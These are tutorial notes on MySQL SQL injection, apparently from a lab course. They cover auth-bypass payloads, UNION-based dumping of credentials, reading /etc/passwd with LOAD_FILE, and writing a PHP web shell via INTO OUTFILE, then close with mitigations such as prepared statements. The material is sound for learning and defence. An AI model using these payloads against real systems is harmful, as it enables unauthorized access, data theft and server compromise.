# SQL Injection Fundamentals

---

## Introduction to SQL Injection

SQL Injection (SQLi) is one of the most dangerous and common web application vulnerabilities. It happens when a malicious user tricks a web application into sending a modified SQL query to the database. Modern web applications interact with databases in real-time — when a user sends an HTTP request, the back-end builds a SQL query and runs it against the database. If user input is used to build that query without proper checking, an attacker can manipulate it to do things the developer never intended.

SQL Injection specifically targets **relational databases** like MySQL, PostgreSQL, and MSSQL. Non-relational databases (like MongoDB) have a different type of attack called NoSQL injection, which is a separate topic. This guide focuses entirely on MySQL-based SQL injection.

---

## Use of SQL in Web Applications

Web applications connect to a database on the back-end server and use SQL queries to store and retrieve data. For example, a PHP application connects to MySQL and runs queries like `SELECT * FROM logins` to fetch user data. The results are stored in a variable and then displayed on the page.

```php
// Connect to the MySQL database
$conn = new mysqli("localhost", "root", "password", "users");

// Run a query to get all users
$query = "select * from logins";
$result = $conn->query($query);
```

This command `new mysqli(...)` creates a connection to the MySQL database running on the local machine using the given username and password. The `$conn->query($query)` part actually sends the SQL statement to the database and stores the results in `$result`.

```php
// Print each username on a new line
while($row = $result->fetch_assoc()) {
    echo $row["name"] . "<br>";
}
```

This loop goes through each row returned by the query and prints the `name` field. The `fetch_assoc()` function fetches one row at a time as an associative array (key = column name, value = column value).

When web apps use **user input** inside SQL queries (like a search box), the risk of SQL injection appears:

```php
// Take the user's search input from a form
$searchInput = $_POST['findUser'];

// Directly put it inside the SQL query — DANGEROUS!
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Here `$_POST['findUser']` takes whatever the user typed in a form. That input is directly placed inside the SQL query string using `'%$searchInput'`. If the user types a normal word, it works fine — but if they type SQL code, the database will execute it.

---

## What is an Injection?

An injection attack happens when user input is **interpreted as code** instead of plain text. Normally, a web application should treat user input as just a string — something to search for or display. But if special characters like a single quote (`'`) are not removed or escaped, the database engine sees the input as part of the SQL command itself.

**Sanitization** is the process of cleaning user input by removing or escaping special characters so they cannot break out of their intended role as plain data. If sanitization is missing, an attacker can "escape" the user input field and write their own SQL code directly into the query.

For example, if the input is `admin' OR '1'='1`, the database will see this as SQL logic, not as a search term. This is the core concept behind SQL injection — the attacker makes the database run code that was never meant to run.

---

## SQL Injection — How It Works

When user input is placed directly into a SQL query without sanitization, an attacker can add a single quote (`'`) to close the string, then write their own SQL code after it.

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
```

If a user types `admin`, the query becomes:

```sql
select * from logins where username like '%admin'
```

That is fine. But if the user types `1'; DROP TABLE users;`, the query becomes:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

The single quote after `1` closes the original string. Then `DROP TABLE users;` becomes a new SQL command that deletes the users table entirely. The trailing single quote at the end causes a syntax error in MySQL, but this demonstrates the concept of breaking out of user input boundaries.

> **Note:** Stacking two queries with `;` works in MSSQL and PostgreSQL, but **not in MySQL**. MySQL requires different techniques covered in later sections.

---

## Syntax Errors in Injections

A naive injection attempt often causes a **syntax error** because the resulting SQL is not valid. For example, an extra or unclosed quote breaks the query structure. To make an injection actually work, the attacker must ensure the final SQL query is valid — no broken strings, no unclosed parentheses.

Two common techniques to fix this:

1. **Use SQL comments** (`--` or `#`) to cut off the rest of the original query after the injection.
2. **Balance the quotes** carefully so the query remains syntactically correct.

If the attacker cannot see the source code, they must experiment with payloads to find what makes a valid query. This is a core skill in SQL injection testing.

---

## Even vs Odd Quotes — When and Why It Matters

This is one of the most important practical concepts in SQL injection. Whether you use an **even** or **odd** number of single quotes in your payload depends entirely on **how the original SQL query wraps your input**. Getting this wrong causes a syntax error and your injection fails silently.

### The Core Rule

In SQL, every string must be opened and closed with matching quotes. If there is an **odd** number of single quotes in the final query, MySQL throws a syntax error because one quote is left unclosed and hanging. Your goal as an attacker is always to make sure the **total number of quotes in the entire final query is even** — every opening quote has a matching closing quote.

### How the Original Query Wraps Your Input

The number of quotes you inject depends on what is already in the query around your input. Look at these two common patterns:

**Pattern 1 — Input is inside single quotes:**
```sql
SELECT * FROM logins WHERE username = '$input'
```
Here your input is already wrapped in `'...'`. The query already contributes **2 quotes** around your input (one before, one after). If you inject one single quote `'`, the total becomes **3 quotes** — that is odd → syntax error. So you must either inject **zero extra quotes** (use comments to kill the rest) or inject **two quotes** to keep the count even.

**Pattern 2 — Input is NOT inside quotes (numeric parameter):**
```sql
SELECT * FROM logins WHERE id = $input
```
Here your input has no surrounding quotes at all. The query contributes **zero quotes**. You can inject freely without worrying about quote balancing — just inject SQL directly like `1 OR 1=1`.

### The Even Quote Rule in Practice

When your input IS inside single quotes, you need to "escape" out of them. Injecting **one** single quote closes the string early (good), but now the remaining `'` at the end of the original query is unclosed (bad — odd total). You fix this in one of two ways:

**Fix 1 — Use a comment to kill the trailing quote:**
```sql
-- Your input:  admin'--
-- Final query: SELECT * FROM logins WHERE username='admin'-- ' AND password='x'
--                                                         ^ comment kills everything after
```
You inject **one** quote to escape the string, then `--` comments out the rest including the original closing quote. The total quotes that MySQL actually processes is **2** (even) — the one before `admin` and the one you injected.

**Fix 2 — Keep an even number of quotes in your payload:**
```sql
-- Your input:  admin' or '1'='1
-- Final query: SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='x'
```
Count the quotes: `'admin'`, `'1'`, `'1'` — every string is properly opened and closed. Total quotes = even. No syntax error. This is exactly why the OR injection payload is written as `' or '1'='1` and NOT `' or '1'='1'` — adding that last quote would make it odd again because the original query already supplies the closing quote.

### Why the Trailing Quote Matters So Much

Look at the original query structure:

```sql
WHERE username='[YOUR INPUT HERE]' AND password='x'
                                 ^
                          this quote already exists
```

When you inject `admin' or '1'='1`, the query becomes:

```sql
WHERE username='admin' or '1'='1' AND password='x'
```

The original `'` after your input slot becomes the closing quote for `'1'`. Everything is balanced. But if you had injected `admin' or '1'='1'` (one extra quote at the end), the original trailing `'` would be a 9th unpaired quote — syntax error.

### Quick Decision Guide

| Situation | What to do |
|---|---|
| Input is inside `'...'` in the query | Inject one `'` to escape, then use `-- -` to comment the rest |
| Input is inside `'...'` and you want to keep the query alive | Craft payload so total quotes in your input + surrounding ones = even |
| Input is a raw number (no quotes around it) | No quote balancing needed — inject SQL directly |
| You see an error with one `'` injected | That confirms it's quote-wrapped and vulnerable |
| You see no error with one `'` injected | Either not vulnerable or it's a numeric/unquoted parameter |

### Testing with One Quote First

The standard first step when discovering SQL injection is always to inject **a single quote** (`'`) and observe:

- **Syntax error appears** → Your input is inside quotes in the query. The single quote created an odd count and broke the query. The application is very likely vulnerable.
- **No error, page looks normal** → Either the app is sanitizing your input, or the parameter is numeric and your quote was just treated as invalid data.
- **Blank page or weird behavior** → Something changed — worth investigating further with different payloads.

This single-quote test is the foundation of SQLi discovery because it instantly reveals whether your input is being placed inside a quoted string context in the SQL query.

---

## Types of SQL Injection

SQL Injections are categorized based on **how and where the output is retrieved**.

### In-Band SQL Injection

The output of the injected query is returned directly in the web page response. This is the easiest type to exploit because you can read results immediately.

- **Union-Based:** The attacker adds a `UNION SELECT` statement to the original query. The injected results appear alongside the original results on the page. The attacker must know the exact number and type of columns.
- **Error-Based:** The attacker intentionally causes a SQL error that includes database information in the error message. Useful when the app shows detailed SQL errors.

### Blind SQL Injection

The web page does not display query results directly — the attacker has to figure out the data bit by bit or character by character.

- **Boolean-Based:** The attacker sends queries with true/false conditions (like `AND 1=1` vs `AND 1=2`) and observes whether the page changes. If `1=1` shows results but `1=2` shows nothing, the attacker knows the condition is being evaluated.
- **Time-Based:** Uses functions like `SLEEP(5)` to delay the server response. If the page loads slowly when `SLEEP(5)` is injected, it confirms the injection is working even when no visible change appears.

### Out-of-Band SQL Injection

The attacker cannot see results on the page at all. Instead, they trick the database into sending data to an external server they control (e.g., via a DNS lookup). This is the most advanced type and used as a last resort.

---

## Subverting Query Logic — Authentication Bypass

One of the most powerful and classic uses of SQL injection is **logging in as any user without knowing their password**. Consider this login query:

```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

This query checks both username and password. If both match a record in the database, login succeeds. If not, it fails. The `AND` operator means both conditions must be true.

### Testing for SQLi Vulnerability

Before trying to bypass login, first check if the login form is even vulnerable. Try injecting these payloads into the username field one at a time:

| Payload | URL Encoded |
|---------|-------------|
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

If injecting a single quote (`'`) causes a SQL error message instead of a normal "Login Failed" message, the form is likely vulnerable.

### OR Injection

The `AND` operator requires **both** conditions to be true. The `OR` operator only requires **one** condition to be true. Attackers exploit this by injecting an OR condition that is always true.

**Payload:** `admin' or '1'='1`

This makes the query:

```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';
```

SQL evaluates `AND` before `OR` (operator precedence). So:
- `'1'='1' AND password='something'` → TRUE AND FALSE → FALSE
- `username='admin' OR FALSE` → if `admin` exists → TRUE

The login succeeds if `admin` exists in the database. To bypass login **without knowing any username**, inject the OR condition in both fields:

- Username: `' or '1'='1`
- Password: `' or '1'='1`

The final query becomes:

```sql
SELECT * FROM logins WHERE username='' OR '1'='1' AND password='' OR '1'='1';
```

This returns all rows, and the first row's user gets logged in.

---

## Using Comments to Bypass Authentication

SQL comments let you ignore parts of a query. In MySQL, there are two ways to write comments:

- `--` followed by a space: `-- ` (note the space, often written as `-- -` to make the space visible)
- `#` symbol

```sql
-- This is a comment, everything after it is ignored
SELECT username FROM logins; -- Selects usernames from the logins table
```

The `--` tells MySQL to treat everything after it on that line as a comment — it is completely ignored during execution. This is extremely useful in SQL injection because you can cut off the rest of the original query.

### Example: Comment-Based Auth Bypass

Inject `admin'-- ` as the username:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Everything after `--` is a comment and is ignored. So the query effectively becomes:

```sql
SELECT * FROM logins WHERE username='admin';
```

The password check is completely gone. Login succeeds as `admin` with **any password**.

> **Browser Tip:** In a browser URL, `#` is treated as a fragment identifier and is not sent to the server. Use `%23` (the URL-encoded form of `#`) instead when injecting via the URL.

### Handling Parentheses

Some applications wrap conditions in parentheses for priority:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hash';
```

Here `admin` cannot log in because the admin's `id` is 1, and `id > 1` is false. Using `admin'--` causes a syntax error because the open parenthesis `(` is never closed.

Fix: inject `admin')-- ` to close the parenthesis before the comment:

```sql
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='hash';
```

The query now simply checks `username='admin'` and ignores everything else. Login succeeds.

---

## The UNION Clause

The `UNION` clause in SQL is used to combine the results of two or more `SELECT` statements into one result set. In SQL injection, `UNION` is used to pull data from completely different tables that were not part of the original query.

```sql
-- Get data from two tables at once
SELECT * FROM ports UNION SELECT * FROM ships;
```

This command runs two separate `SELECT` queries and stacks their results together into one table. `ports` and `ships` each contribute their rows to the combined output.

### Rules for UNION

1. **Same number of columns:** Both `SELECT` statements must return the same number of columns. Otherwise MySQL returns: `ERROR 1222: The used SELECT statements have a different number of columns`.
2. **Compatible data types:** Columns in matching positions should have compatible types (numbers with numbers, strings with strings, etc.).

### Filling Missing Columns with Junk Data

If the original query has 4 columns but you only want to extract 1 column from another table, fill the remaining 3 positions with dummy values like numbers:

```sql
-- Extract username from passwords table, fill other 3 columns with junk
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2, 3, 4 FROM passwords-- '
```

The numbers `2, 3, 4` are just placeholder values. They match the required column count without meaning anything. Using numbers also makes it easy to track which column positions are visible on the page.

> **Tip:** Use `NULL` for junk columns in advanced cases since `NULL` is compatible with any data type.

---

## Union Injection — Finding Column Count and Visible Columns

Before running a useful UNION injection, you need two things:
1. **How many columns** does the original query return?
2. **Which of those columns** are actually displayed on the page?

### Method 1: ORDER BY to Find Column Count

Inject `ORDER BY` with increasing column numbers until you get an error. `ORDER BY 1` sorts by column 1, `ORDER BY 2` sorts by column 2, and so on. When you hit a number that doesn't exist, MySQL throws an error.

```sql
' order by 1-- -   -- Works, at least 1 column exists
' order by 2-- -   -- Works, at least 2 columns exist
' order by 5-- -   -- Error: "Unknown column '5' in 'order clause'" → table has 4 columns
```

The command `ORDER BY N` asks MySQL to sort the results by the Nth column. If that column doesn't exist, MySQL throws an error — that tells you the table has fewer than N columns.

### Method 2: UNION SELECT to Find Column Count

Try UNION with different numbers of columns until it succeeds:

```sql
cn' UNION select 1,2,3-- -       -- Error: column count mismatch
cn' UNION select 1,2,3,4-- -     -- Success: table has 4 columns
```

### Finding Which Columns Are Visible

The original query might return 4 columns, but only 3 might be shown on the page (e.g., column 1 is an internal ID never displayed). To find visible columns, replace the number values with `@@version` or any real data:

```sql
cn' UNION select 1,@@version,3,4-- -
```

`@@version` is a MySQL system variable that returns the database version string (e.g., `10.3.22-MariaDB`). If you see the version number appear on the page in column 2's position, you know column 2 is visible and usable for data extraction.

---

## Database Enumeration Using UNION

Once you know the number of visible columns, you can start extracting real data from the database.

### MySQL Fingerprinting

Before enumerating, identify the database type to use the right queries:

| Payload | Expected MySQL Output |
|---|---|
| `SELECT @@version` | MySQL version string |
| `SELECT POW(1,1)` | Returns `1` |
| `SELECT SLEEP(5)` | Delays page by 5 seconds |

### Finding All Databases — INFORMATION_SCHEMA.SCHEMATA

MySQL has a built-in database called `INFORMATION_SCHEMA` that stores metadata about everything in the database server — all databases, all tables, all columns. You cannot directly access other databases from a query, but you can read their structure through `INFORMATION_SCHEMA`.

```sql
-- List all database names on the server
cn' UNION select 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

`INFORMATION_SCHEMA.SCHEMATA` is a special table that holds one row per database. The `schema_name` column contains the database name. This query pulls all database names and displays them in column 2's position on the page.

To find which database the web app is currently using:

```sql
cn' UNION select 1, database(), 2, 3-- -
```

`database()` is a MySQL function that returns the name of the currently selected database. This tells you which database the web application is actively using.

### Finding Tables — INFORMATION_SCHEMA.TABLES

```sql
-- List all tables inside the 'dev' database
cn' UNION select 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
```

`INFORMATION_SCHEMA.TABLES` holds metadata about every table across all databases. `TABLE_NAME` is the table name and `TABLE_SCHEMA` is the database it belongs to. The `WHERE table_schema='dev'` filter limits results to only the `dev` database, so you don't get thousands of rows from every database at once.

### Finding Columns — INFORMATION_SCHEMA.COLUMNS

```sql
-- Find all column names inside the 'credentials' table
cn' UNION select 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
```

`INFORMATION_SCHEMA.COLUMNS` stores information about every column in every table. `COLUMN_NAME` gives you the column names. After finding that `credentials` has `username` and `password` columns, you can dump the actual data.

### Dumping the Data

```sql
-- Extract username and password from the credentials table in the dev database
cn' UNION select 1, username, password, 4 FROM dev.credentials-- -
```

The `dev.credentials` syntax uses the **dot operator** to reference a table (`credentials`) inside a specific database (`dev`). This is necessary because the web app's current database is `ilfreight`, not `dev`. Without the dot operator, MySQL would look for `credentials` in the wrong database.

---

## Reading Files via SQL Injection

SQL injection can go beyond just reading database data — it can read files from the server's file system too.

### Checking Privileges

To read files, the database user needs the `FILE` privilege. First check who you are:

```sql
-- Find the current database user
cn' UNION SELECT 1, user(), 3, 4-- -
```

`user()` is a MySQL function that returns the name of the currently connected database user (e.g., `root@localhost`). Knowing you're `root` is a strong indicator you have elevated privileges.

Then check for super privileges:

```sql
-- Check if current user has superuser privilege
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

`mysql.user` is a system table that stores all database user accounts and their permissions. `super_priv` is `Y` (yes) if the user has superuser rights. Superuser means almost no restrictions inside the database.

Check specific FILE privilege:

```sql
-- List all specific privileges for root user
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

`information_schema.user_privileges` stores which specific SQL privileges are granted to each user. If `FILE` appears in `privilege_type`, the user can read and write files on the server.

### LOAD_FILE() — Reading Server Files

```sql
-- Read the /etc/passwd file (Linux user accounts)
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

`LOAD_FILE("/etc/passwd")` is a MySQL function that reads the entire contents of the specified file from the server's file system and returns it as a string. The `/etc/passwd` file in Linux stores user account information. If the MySQL OS user has read permission on the file, its contents appear on the page.

You can also read web application source code:

```sql
-- Read the PHP source code of the search page
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

This reads the PHP file that serves the page you're currently on. Finding database credentials, logic flaws, or other vulnerabilities in the source code is a very common step in advanced exploitation.

---

## Writing Files and Web Shells via SQL Injection

Writing files is more restricted than reading them, but if allowed, it can lead to full server compromise.

### Requirements to Write Files

1. Database user must have the `FILE` privilege.
2. The MySQL `secure_file_priv` variable must allow writes (must be empty, not NULL).
3. The MySQL process must have OS-level write access to the target directory.

### Checking secure_file_priv

```sql
-- Check the value of secure_file_priv global variable
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

`information_schema.global_variables` stores all MySQL global configuration variables. `secure_file_priv` controls which directory MySQL can read/write files from. If the value is **empty**, MySQL can access any directory. If it's a path, only that directory. If it's `NULL`, file operations are completely disabled.

### SELECT INTO OUTFILE — Writing Files

```sql
-- Write a test string to a file on the server
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

`INTO OUTFILE '/path/to/file'` is a MySQL clause that redirects the output of a `SELECT` query into a file on the server's file system instead of returning it to the user. The MySQL process must have write permission to the specified directory.

Test writing to the web root:

```sql
-- Write a simple test to confirm write access to the web folder
cn' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

`/var/www/html/` is the default root folder for Apache web servers on Linux — any file placed here is accessible through the browser. If the file appears when you browse to `http://TARGET/proof.txt`, write access is confirmed.

### Writing a PHP Web Shell

A web shell is a small script uploaded to the server that lets you run OS commands through the browser.

```sql
-- Write a PHP web shell to the web root
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

`<?php system($_REQUEST[0]); ?>` is a PHP one-liner. `$_REQUEST[0]` takes the value of the `0` parameter from the URL. `system()` runs it as an OS shell command and prints the output. Empty strings `""` are used instead of numbers so the file is cleaner (no `1 3 4` junk in the output).

Access the shell and run commands:

```
http://TARGET/shell.php?0=id
```

The `?0=id` part passes the `id` command as the value of parameter `0`. The `id` command in Linux prints the current user and group, confirming code execution. If you see something like `uid=33(www-data)`, your injected shell is running on the server.

---

## Mitigating SQL Injection

Knowing how SQL injection works is only half the battle — the other half is preventing it.

### 1. Input Sanitization

Use functions that escape special characters before they go into a SQL query. In PHP with MySQL, `mysqli_real_escape_string()` escapes characters like `'`, `"`, and `\` so they are treated as literal text, not SQL syntax.

```php
// Escape user input before using it in a query
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
```

`mysqli_real_escape_string($conn, $input)` takes the database connection and the raw input string. It adds backslashes before dangerous characters. For example, `admin'--` becomes `admin\'--` — the single quote is neutralized and cannot break out of the string.

### 2. Input Validation

Validate that user input matches the **expected format** before using it at all. Use regular expressions to reject anything that doesn't fit.

```php
// Only allow letters and spaces — reject anything else
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if (!preg_match($pattern, $code)) {
    die("Invalid input! Please try again.");
}
```

`preg_match($pattern, $input)` checks if the input matches the regex pattern. `^[A-Za-z\s]+$` means: start to end, only letters (uppercase or lowercase) and whitespace are allowed. Anything else — numbers, quotes, semicolons — causes `preg_match` to return false and the script immediately stops with an error message.

### 3. Least Privilege for DB Users

Never connect web applications to the database as `root` or any admin user. Create a dedicated user with only the permissions needed.

```sql
-- Create a new limited user
CREATE USER 'reader'@'localhost';

-- Grant only SELECT on the specific table needed
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

`CREATE USER` makes a new MySQL account. `GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost'` gives this user permission to only run `SELECT` queries on the single `ports` table in the `ilfreight` database — nothing else. Even if SQL injection occurs with this user, the attacker cannot `DROP` tables, `INSERT` data, or read from other tables.

### 4. Web Application Firewall (WAF)

A WAF sits between users and the web server and inspects incoming requests for malicious patterns. It blocks requests containing SQL injection signatures like `UNION SELECT`, `DROP TABLE`, `INFORMATION_SCHEMA`, etc.

- **Open-source:** ModSecurity
- **Commercial/Cloud:** Cloudflare WAF

WAFs are not perfect and can be bypassed, but they add a strong layer of defense and stop most automated attacks.

### 5. Parameterized Queries (Prepared Statements)

This is the most effective prevention method. Instead of building SQL strings with user input concatenated in, use **placeholders** (`?`) that the database fills in safely after the query structure is already set.

```php
// Use placeholders instead of directly inserting user input
$query = "SELECT * FROM logins WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);

// Bind the actual values — MySQL handles escaping automatically
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```

`mysqli_prepare($conn, $query)` sends the SQL query structure to MySQL **before** any user data is involved. MySQL knows the shape of the query. Then `mysqli_stmt_bind_param($stmt, 'ss', $username, $password)` binds the user's values to the `?` placeholders. The `'ss'` means both values are strings. MySQL treats the values as pure data — no matter what characters they contain, they cannot change the query structure.

---

*These notes cover SQL Injection fundamentals from basic concepts through exploitation and mitigation.*
